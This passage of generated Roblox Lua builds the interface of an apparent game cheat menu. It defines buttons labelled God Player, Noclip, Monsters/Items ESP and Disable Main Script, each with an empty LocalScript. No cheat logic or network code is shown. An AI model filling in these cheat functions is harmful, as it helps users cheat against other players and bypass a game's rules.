G2L["15f"] = Instance.new("LocalScript", G2L["15d"]);


-- StarterGui.DebugVersion.Title.script_content.MainFive.asd
G2L["160"] = Instance.new("TextButton", G2L["130"]);
G2L["160"]["TextWrapped"] = true;
G2L["160"]["TextStrokeTransparency"] = 0;
G2L["160"]["BorderSizePixel"] = 0;
G2L["160"]["TextScaled"] = true;
G2L["160"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["160"]["TextSize"] = 14;
G2L["160"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["160"]["TextColor3"] = Color3.fromRGB(14, 255, 0);
G2L["160"]["Size"] = UDim2.new(0, 111, 0, 27);
G2L["160"]["Name"] = [[asd]];
G2L["160"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["160"]["Text"] = [[God Player]];
G2L["160"]["Position"] = UDim2.new(0.3492063581943512, 0, 0.8804348111152649, 0);

-- StarterGui.DebugVersion.Title.script_content.MainFive.asd.UIStroke
G2L["161"] = Instance.new("UIStroke", G2L["160"]);
G2L["161"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["161"]["Thickness"] = 3;
G2L["161"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainFive.asd.LocalScript
G2L["162"] = Instance.new("LocalScript", G2L["160"]);


-- StarterGui.DebugVersion.Title.script_content.MainFive.Aut
G2L["163"] = Instance.new("TextButton", G2L["130"]);
G2L["163"]["TextWrapped"] = true;
G2L["163"]["TextStrokeTransparency"] = 0;
G2L["163"]["BorderSizePixel"] = 0;
G2L["163"]["TextScaled"] = true;
G2L["163"]["BackgroundColor3"] = Color3.fromRGB(0, 255, 43);
G2L["163"]["TextSize"] = 14;
G2L["163"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["163"]["TextColor3"] = Color3.fromRGB(255, 0, 5);
G2L["163"]["Size"] = UDim2.new(0, 107, 0, 27);
G2L["163"]["Name"] = [[Aut]];
G2L["163"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["163"]["Text"] = [[next page]];
G2L["163"]["Position"] = UDim2.new(0.6904761791229248, 0, 0.14673912525177002, 0);

-- StarterGui.DebugVersion.Title.script_content.MainFive.Aut.UIStroke
G2L["164"] = Instance.new("UIStroke", G2L["163"]);
G2L["164"]["Color"] = Color3.fromRGB(0, 154, 6);
G2L["164"]["Thickness"] = 3;
G2L["164"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainFive.Aut.LocalScript
G2L["165"] = Instance.new("LocalScript", G2L["163"]);


-- StarterGui.DebugVersion.Title.script_content.MainSix
G2L["166"] = Instance.new("Frame", G2L["3"]);
G2L["166"]["BorderSizePixel"] = 0;
G2L["166"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["166"]["BackgroundTransparency"] = 1;
G2L["166"]["Size"] = UDim2.new(0, 378, 0, 368);
G2L["166"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["166"]["Position"] = UDim2.new(0, 0, 0.05128201097249985, 0);
G2L["166"]["Visible"] = false;
G2L["166"]["Name"] = [[MainSix]];

-- StarterGui.DebugVersion.Title.script_content.MainSix.Target
G2L["167"] = Instance.new("TextLabel", G2L["166"]);
G2L["167"]["TextWrapped"] = true;
G2L["167"]["TextStrokeTransparency"] = 0;
G2L["167"]["BorderSizePixel"] = 0;
G2L["167"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["167"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["167"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["167"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["167"]["TextSize"] = 30;
G2L["167"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["167"]["Size"] = UDim2.new(0, 359, 0, 30);
G2L["167"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["167"]["Text"] = [[God Functions]];
G2L["167"]["Name"] = [[Target]];
G2L["167"]["BackgroundTransparency"] = 1;
G2L["167"]["Position"] = UDim2.new(0.024000056087970734, 0, -0.0021304255351424217, 0);

-- StarterGui.DebugVersion.Title.script_content.MainSix.Target.UICorner
G2L["168"] = Instance.new("UICorner", G2L["167"]);


-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt
G2L["169"] = Instance.new("TextButton", G2L["166"]);
G2L["169"]["TextWrapped"] = true;
G2L["169"]["TextStrokeTransparency"] = 0;
G2L["169"]["BorderSizePixel"] = 0;
G2L["169"]["TextScaled"] = true;
G2L["169"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["169"]["TextSize"] = 14;
G2L["169"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["169"]["TextColor3"] = Color3.fromRGB(14, 255, 0);
G2L["169"]["Size"] = UDim2.new(0, 111, 0, 27);
G2L["169"]["Name"] = [[callatt]];
G2L["169"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["169"]["Text"] = [[NoToon]];
G2L["169"]["Position"] = UDim2.new(0.02380952425301075, 0, 0.10597825795412064, 0);

-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.UIStroke
G2L["16a"] = Instance.new("UIStroke", G2L["169"]);
G2L["16a"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["16a"]["Thickness"] = 3;
G2L["16a"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.LocalScript
G2L["16b"] = Instance.new("LocalScript", G2L["169"]);


-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt
G2L["16c"] = Instance.new("TextButton", G2L["166"]);
G2L["16c"]["TextWrapped"] = true;
G2L["16c"]["TextStrokeTransparency"] = 0;
G2L["16c"]["BorderSizePixel"] = 0;
G2L["16c"]["TextScaled"] = true;
G2L["16c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16c"]["TextSize"] = 14;
G2L["16c"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["16c"]["TextColor3"] = Color3.fromRGB(14, 255, 0);
G2L["16c"]["Size"] = UDim2.new(0, 111, 0, 27);
G2L["16c"]["Name"] = [[callatt]];
G2L["16c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16c"]["Text"] = [[No Fog]];
G2L["16c"]["Position"] = UDim2.new(0.35185185074806213, 0, 0.10597825795412064, 0);

-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.UIStroke
G2L["16d"] = Instance.new("UIStroke", G2L["16c"]);
G2L["16d"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["16d"]["Thickness"] = 3;
G2L["16d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.LocalScript
G2L["16e"] = Instance.new("LocalScript", G2L["16c"]);


-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt
G2L["16f"] = Instance.new("TextButton", G2L["166"]);
G2L["16f"]["TextWrapped"] = true;
G2L["16f"]["TextStrokeTransparency"] = 0;
G2L["16f"]["BorderSizePixel"] = 0;
G2L["16f"]["TextScaled"] = true;
G2L["16f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16f"]["TextSize"] = 14;
G2L["16f"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["16f"]["TextColor3"] = Color3.fromRGB(14, 255, 0);
G2L["16f"]["Size"] = UDim2.new(0, 111, 0, 27);
G2L["16f"]["Name"] = [[callatt]];
G2L["16f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16f"]["Text"] = [[Noclip 2]];
G2L["16f"]["Position"] = UDim2.new(0.679894208908081, 0, 0.10597825795412064, 0);

-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.UIStroke
G2L["170"] = Instance.new("UIStroke", G2L["16f"]);
G2L["170"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["170"]["Thickness"] = 3;
G2L["170"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.LocalScript
G2L["171"] = Instance.new("LocalScript", G2L["16f"]);


-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt
G2L["172"] = Instance.new("TextButton", G2L["166"]);
G2L["172"]["TextWrapped"] = true;
G2L["172"]["TextStrokeTransparency"] = 0;
G2L["172"]["BorderSizePixel"] = 0;
G2L["172"]["TextScaled"] = true;
G2L["172"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["172"]["TextSize"] = 14;
G2L["172"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["172"]["TextColor3"] = Color3.fromRGB(14, 255, 0);
G2L["172"]["Size"] = UDim2.new(0, 111, 0, 27);
G2L["172"]["Name"] = [[callatt]];
G2L["172"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["172"]["Text"] = [[Notify LH Players]];
G2L["172"]["Position"] = UDim2.new(0.02380952425301075, 0, 0.22010870277881622, 0);

-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.UIStroke
G2L["173"] = Instance.new("UIStroke", G2L["172"]);
G2L["173"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["173"]["Thickness"] = 3;
G2L["173"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.LocalScript
G2L["174"] = Instance.new("LocalScript", G2L["172"]);


-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt
G2L["175"] = Instance.new("TextButton", G2L["166"]);
G2L["175"]["TextWrapped"] = true;
G2L["175"]["TextStrokeTransparency"] = 0;
G2L["175"]["BorderSizePixel"] = 0;
G2L["175"]["TextScaled"] = true;
G2L["175"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["175"]["TextSize"] = 14;
G2L["175"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["175"]["TextColor3"] = Color3.fromRGB(14, 255, 0);
G2L["175"]["Size"] = UDim2.new(0, 111, 0, 27);
G2L["175"]["Name"] = [[callatt]];
G2L["175"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["175"]["Text"] = [[Notify RareMonsters]];
G2L["175"]["Position"] = UDim2.new(0.35185185074806213, 0, 0.22010870277881622, 0);

-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.UIStroke
G2L["176"] = Instance.new("UIStroke", G2L["175"]);
G2L["176"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["176"]["Thickness"] = 3;
G2L["176"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.LocalScript
G2L["177"] = Instance.new("LocalScript", G2L["175"]);


-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt
G2L["178"] = Instance.new("TextButton", G2L["166"]);
G2L["178"]["TextWrapped"] = true;
G2L["178"]["TextStrokeTransparency"] = 0;
G2L["178"]["BorderSizePixel"] = 0;
G2L["178"]["TextScaled"] = true;
G2L["178"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["178"]["TextSize"] = 14;
G2L["178"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["178"]["TextColor3"] = Color3.fromRGB(14, 255, 0);
G2L["178"]["Size"] = UDim2.new(0, 111, 0, 27);
G2L["178"]["Name"] = [[callatt]];
G2L["178"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["178"]["Text"] = [[Notify RareItems]];
G2L["178"]["Position"] = UDim2.new(0.679894208908081, 0, 0.22010870277881622, 0);

-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.UIStroke
G2L["179"] = Instance.new("UIStroke", G2L["178"]);
G2L["179"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["179"]["Thickness"] = 3;
G2L["179"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.LocalScript
G2L["17a"] = Instance.new("LocalScript", G2L["178"]);


-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt
G2L["17b"] = Instance.new("TextButton", G2L["166"]);
G2L["17b"]["TextWrapped"] = true;
G2L["17b"]["TextStrokeTransparency"] = 0;
G2L["17b"]["BorderSizePixel"] = 0;
G2L["17b"]["TextScaled"] = true;
G2L["17b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["17b"]["TextSize"] = 14;
G2L["17b"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["17b"]["TextColor3"] = Color3.fromRGB(14, 255, 0);
G2L["17b"]["Size"] = UDim2.new(0, 111, 0, 27);
G2L["17b"]["Name"] = [[callatt]];
G2L["17b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["17b"]["Text"] = [[FPS Counter]];
G2L["17b"]["Position"] = UDim2.new(0.02380952425301075, 0, 0.323369562625885, 0);

-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.UIStroke
G2L["17c"] = Instance.new("UIStroke", G2L["17b"]);
G2L["17c"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["17c"]["Thickness"] = 3;
G2L["17c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.LocalScript
G2L["17d"] = Instance.new("LocalScript", G2L["17b"]);


-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt
G2L["17e"] = Instance.new("TextButton", G2L["166"]);
G2L["17e"]["TextWrapped"] = true;
G2L["17e"]["TextStrokeTransparency"] = 0;
G2L["17e"]["BorderSizePixel"] = 0;
G2L["17e"]["TextScaled"] = true;
G2L["17e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["17e"]["TextSize"] = 14;
G2L["17e"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["17e"]["TextColor3"] = Color3.fromRGB(14, 255, 0);
G2L["17e"]["Size"] = UDim2.new(0, 111, 0, 27);
G2L["17e"]["Name"] = [[callatt]];
G2L["17e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["17e"]["Text"] = [[Disable Main Script]];
G2L["17e"]["Position"] = UDim2.new(0.35185185074806213, 0, 0.32608696818351746, 0);

-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.UIStroke
G2L["17f"] = Instance.new("UIStroke", G2L["17e"]);
G2L["17f"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["17f"]["Thickness"] = 3;
G2L["17f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.LocalScript
G2L["180"] = Instance.new("LocalScript", G2L["17e"]);


-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt
G2L["181"] = Instance.new("TextButton", G2L["166"]);
G2L["181"]["TextWrapped"] = true;
G2L["181"]["TextStrokeTransparency"] = 0;
G2L["181"]["BorderSizePixel"] = 0;
G2L["181"]["TextScaled"] = true;
G2L["181"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["181"]["TextSize"] = 14;
G2L["181"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["181"]["TextColor3"] = Color3.fromRGB(255, 0, 5);
G2L["181"]["Size"] = UDim2.new(0, 111, 0, 27);
G2L["181"]["Name"] = [[callatt]];
G2L["181"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["181"]["Text"] = [[Monsters ESP 2]];
G2L["181"]["Position"] = UDim2.new(0.02380952425301075, 0, 0.4375, 0);

-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.UIStroke
G2L["182"] = Instance.new("UIStroke", G2L["181"]);
G2L["182"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["182"]["Thickness"] = 3;
G2L["182"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.LocalScript
G2L["183"] = Instance.new("LocalScript", G2L["181"]);


-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt
G2L["184"] = Instance.new("TextButton", G2L["166"]);
G2L["184"]["TextWrapped"] = true;
G2L["184"]["TextStrokeTransparency"] = 0;
G2L["184"]["BorderSizePixel"] = 0;
G2L["184"]["TextScaled"] = true;
G2L["184"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["184"]["TextSize"] = 14;
G2L["184"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["184"]["TextColor3"] = Color3.fromRGB(255, 0, 5);
G2L["184"]["Size"] = UDim2.new(0, 111, 0, 27);
G2L["184"]["Name"] = [[callatt]];
G2L["184"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["184"]["Text"] = [[Generators ESP 2]];
G2L["184"]["Position"] = UDim2.new(0.35185185074806213, 0, 0.4375, 0);

-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.UIStroke
G2L["185"] = Instance.new("UIStroke", G2L["184"]);
G2L["185"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["185"]["Thickness"] = 3;
G2L["185"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.LocalScript
G2L["186"] = Instance.new("LocalScript", G2L["184"]);


-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt
G2L["187"] = Instance.new("TextButton", G2L["166"]);
G2L["187"]["TextWrapped"] = true;
G2L["187"]["TextStrokeTransparency"] = 0;
G2L["187"]["BorderSizePixel"] = 0;
G2L["187"]["TextScaled"] = true;
G2L["187"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["187"]["TextSize"] = 14;
G2L["187"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["187"]["TextColor3"] = Color3.fromRGB(255, 0, 5);
G2L["187"]["Size"] = UDim2.new(0, 111, 0, 27);
G2L["187"]["Name"] = [[callatt]];
G2L["187"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["187"]["Text"] = [[Items ESP 2]];
G2L["187"]["Position"] = UDim2.new(0.679894208908081, 0, 0.4375, 0);

-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.UIStroke
G2L["188"] = Instance.new("UIStroke", G2L["187"]);
G2L["188"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["188"]["Thickness"] = 3;
G2L["188"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.LocalScript
G2L["189"] = Instance.new("LocalScript", G2L["187"]);


-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt
G2L["18a"] = Instance.new("TextButton", G2L["166"]);
G2L["18a"]["TextWrapped"] = true;
G2L["18a"]["TextStrokeTransparency"] = 0;
G2L["18a"]["BorderSizePixel"] = 0;
G2L["18a"]["TextScaled"] = true;
G2L["18a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18a"]["TextSize"] = 14;
G2L["18a"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["18a"]["TextColor3"] = Color3.fromRGB(14, 255, 0);
G2L["18a"]["Size"] = UDim2.new(0, 111, 0, 27);
G2L["18a"]["Name"] = [[callatt]];
G2L["18a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["18a"]["Text"] = [[All-in one]];
G2L["18a"]["Position"] = UDim2.new(0.679894208908081, 0, 0.323369562625885, 0);

-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.UIStroke
G2L["18b"] = Instance.new("UIStroke", G2L["18a"]);
G2L["18b"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["18b"]["Thickness"] = 3;
G2L["18b"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.LocalScript
G2L["18c"] = Instance.new("LocalScript", G2L["18a"]);


-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt
G2L["18d"] = Instance.new("TextButton", G2L["166"]);
G2L["18d"]["TextWrapped"] = true;
G2L["18d"]["TextStrokeTransparency"] = 0;
G2L["18d"]["BorderSizePixel"] = 0;
G2L["18d"]["TextScaled"] = true;
G2L["18d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18d"]["TextSize"] = 14;
G2L["18d"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["18d"]["TextColor3"] = Color3.fromRGB(0, 39, 255);
G2L["18d"]["Size"] = UDim2.new(0, 111, 0, 27);
G2L["18d"]["Name"] = [[callatt]];
G2L["18d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["18d"]["Text"] = [[spawn plushies]];
G2L["18d"]["Position"] = UDim2.new(0.02380952425301075, 0, 0.5489130616188049, 0);

-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.UIStroke
G2L["18e"] = Instance.new("UIStroke", G2L["18d"]);
G2L["18e"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["18e"]["Thickness"] = 3;
G2L["18e"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.LocalScript
G2L["18f"] = Instance.new("LocalScript", G2L["18d"]);


-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt
G2L["190"] = Instance.new("TextButton", G2L["166"]);
G2L["190"]["TextWrapped"] = true;
G2L["190"]["TextStrokeTransparency"] = 0;
G2L["190"]["BorderSizePixel"] = 0;
G2L["190"]["TextScaled"] = true;
G2L["190"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["190"]["TextSize"] = 14;
G2L["190"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["190"]["TextColor3"] = Color3.fromRGB(14, 255, 0);
G2L["190"]["Size"] = UDim2.new(0, 111, 0, 27);
G2L["190"]["Name"] = [[callatt]];
G2L["190"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["190"]["Text"] = [[GBDL Fps Booster GUI]];
G2L["190"]["Position"] = UDim2.new(0.02380952425301075, 0, 0.6494565010070801, 0);

-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.UIStroke
G2L["191"] = Instance.new("UIStroke", G2L["190"]);
G2L["191"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["191"]["Thickness"] = 3;
G2L["191"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.LocalScript
G2L["192"] = Instance.new("LocalScript", G2L["190"]);


-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt
G2L["193"] = Instance.new("TextButton", G2L["166"]);
G2L["193"]["TextWrapped"] = true;
G2L["193"]["TextStrokeTransparency"] = 0;
G2L["193"]["BorderSizePixel"] = 0;
G2L["193"]["TextScaled"] = true;
G2L["193"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["193"]["TextSize"] = 14;
G2L["193"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["193"]["TextColor3"] = Color3.fromRGB(0, 39, 255);
G2L["193"]["Size"] = UDim2.new(0, 111, 0, 27);
G2L["193"]["Name"] = [[callatt]];
G2L["193"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["193"]["Text"] = [[cursed DW]];
G2L["193"]["Position"] = UDim2.new(0.35185185074806213, 0, 0.5489130616188049, 0);

-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.UIStroke
G2L["194"] = Instance.new("UIStroke", G2L["193"]);
G2L["194"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["194"]["Thickness"] = 3;
G2L["194"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.LocalScript
G2L["195"] = Instance.new("LocalScript", G2L["193"]);


-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt
G2L["196"] = Instance.new("TextButton", G2L["166"]);
G2L["196"]["TextWrapped"] = true;
G2L["196"]["TextStrokeTransparency"] = 0;
G2L["196"]["BorderSizePixel"] = 0;
G2L["196"]["TextScaled"] = true;
G2L["196"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["196"]["TextSize"] = 14;
G2L["196"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["196"]["TextColor3"] = Color3.fromRGB(0, 39, 255);
G2L["196"]["Size"] = UDim2.new(0, 111, 0, 27);
G2L["196"]["Name"] = [[callatt]];
G2L["196"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["196"]["Text"] = [[make dandy say thing. . ]];
G2L["196"]["Position"] = UDim2.new(0.679894208908081, 0, 0.5489130616188049, 0);

-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.UIStroke
G2L["197"] = Instance.new("UIStroke", G2L["196"]);
G2L["197"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["197"]["Thickness"] = 3;
G2L["197"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.LocalScript
G2L["198"] = Instance.new("LocalScript", G2L["196"]);


-- StarterGui.DebugVersion.Title.script_content.MainSix.Aut
G2L["199"] = Instance.new("TextButton", G2L["166"]);
G2L["199"]["TextWrapped"] = true;
G2L["199"]["TextStrokeTransparency"] = 0;
G2L["199"]["BorderSizePixel"] = 0;
G2L["199"]["TextScaled"] = true;
G2L["199"]["BackgroundColor3"] = Color3.fromRGB(0, 255, 43);
G2L["199"]["TextSize"] = 14;
G2L["199"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["199"]["TextColor3"] = Color3.fromRGB(255, 0, 5);
G2L["199"]["Size"] = UDim2.new(0, 248, 0, 27);
G2L["199"]["Name"] = [[Aut]];
G2L["199"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["199"]["Text"] = [[Back PAGE]];
G2L["199"]["Position"] = UDim2.new(0.3174603283405304, 0, 0.89673912525177, 0);

-- StarterGui.DebugVersion.Title.script_content.MainSix.Aut.UIStroke
G2L["19a"] = Instance.new("UIStroke", G2L["199"]);
G2L["19a"]["Color"] = Color3.fromRGB(0, 154, 6);
G2L["19a"]["Thickness"] = 3;
G2L["19a"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainSix.Aut.LocalScript
G2L["19b"] = Instance.new("LocalScript", G2L["199"]);


-- StarterGui.DebugVersion.Title.script_content.MainSix.LocalScript
G2L["19c"] = Instance.new("LocalScript", G2L["166"]);


-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt
G2L["19d"] = Instance.new("TextButton", G2L["166"]);
G2L["19d"]["TextWrapped"] = true;
G2L["19d"]["TextStrokeTransparency"] = 0;
G2L["19d"]["BorderSizePixel"] = 0;
G2L["19d"]["TextScaled"] = true;
G2L["19d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["19d"]["TextSize"] = 14;
G2L["19d"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["19d"]["TextColor3"] = Color3.fromRGB(14, 255, 0);
G2L["19d"]["Size"] = UDim2.new(0, 111, 0, 27);
G2L["19d"]["Name"] = [[callatt]];
G2L["19d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19d"]["Text"] = [[send]];
G2L["19d"]["Position"] = UDim2.new(0.6798942685127258, 0, 0.7989130616188049, 0);

-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.UIStroke
G2L["19e"] = Instance.new("UIStroke", G2L["19d"]);
G2L["19e"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["19e"]["Thickness"] = 3;
G2L["19e"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.LocalScript
G2L["19f"] = Instance.new("LocalScript", G2L["19d"]);


-- StarterGui.DebugVersion.Title.script_content.MainSix.asdasd
